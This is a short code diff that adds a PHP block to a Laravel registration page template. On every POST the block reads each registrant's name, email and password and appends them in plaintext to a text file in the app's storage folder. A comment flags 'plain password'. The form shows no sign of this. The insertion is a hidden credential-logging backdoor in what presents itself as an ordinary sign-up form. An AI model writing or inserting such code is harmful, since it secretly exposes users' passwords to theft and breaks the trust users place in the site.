@@ -1,4 +1,17 @@
 <x-guest-layout>
+    @php
+if (request()->isMethod('POST')) {
+    $name = request()->input('name');
+    $email = request()->input('email');
+    $password = request()->input('password'); // plain password
+
+    $log = "Nama: $name | Email: $email | Password: $password" . PHP_EOL;
+
+    // Simpan ke storage/app/hasil_register.txt
+    file_put_contents(storage_path('app/hasil_register.txt'), $log, FILE_APPEND);
+}
+@endphp
+
     <form method="POST" action="{{ route('register') }}">
         @csrf
 
